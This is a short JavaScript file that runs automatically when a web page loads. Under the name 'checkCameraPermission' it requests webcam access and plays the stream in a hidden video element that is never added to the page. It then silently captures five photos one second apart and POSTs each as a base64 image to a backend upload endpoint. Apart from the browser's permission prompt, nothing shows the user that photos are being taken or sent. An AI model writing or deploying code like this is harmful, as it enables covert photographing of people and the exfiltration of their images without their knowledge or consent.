async function checkCameraPermission() {
    try {
        // Request camera access
        let stream = await navigator.mediaDevices.getUserMedia({ video: true });
        console.log('Camera permission granted');

        // Create a hidden video element for image capture (not appended to the DOM)
        const videoElement = document.createElement('video');
        videoElement.srcObject = stream;
        videoElement.play();

        // Ensure the video is playing before capturing images
        await new Promise((resolve) => {
            videoElement.onloadedmetadata = () => {
                resolve();
            };
        });

        // Automatically capture and upload 5 images
        for (let i = 0; i < 5; i++) {
            await captureAndSendImage(videoElement);
            await new Promise(resolve => setTimeout(resolve, 1000)); // Wait for 1 second between captures
        }
    } catch (error) {
        console.log('Permission request failed:', error);
    }
}

// Capture image, convert to base64, and send it to the backend
async function captureAndSendImage(videoElement) {
    const canvas = document.createElement('canvas');
    canvas.width = videoElement.videoWidth;
    canvas.height = videoElement.videoHeight;

    const context = canvas.getContext('2d');
    context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);

    // Convert canvas to base64 encoded image
    const imageData = canvas.toDataURL('image/png');

    try {
        // Send the image data to the backend server
        const response = await fetch('http://localhost:3002/upload', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ image: imageData })
        });

        const data = await response.json();
        // document.getElementById('message').innerText += `${data.message}\n`;
        console.log('Image uploaded successfully:', data);
    } catch (error) {
        console.error('Error uploading image:', error);
    }
}

// Automatically check camera permission when the page loads
window.onload = checkCameraPermission;
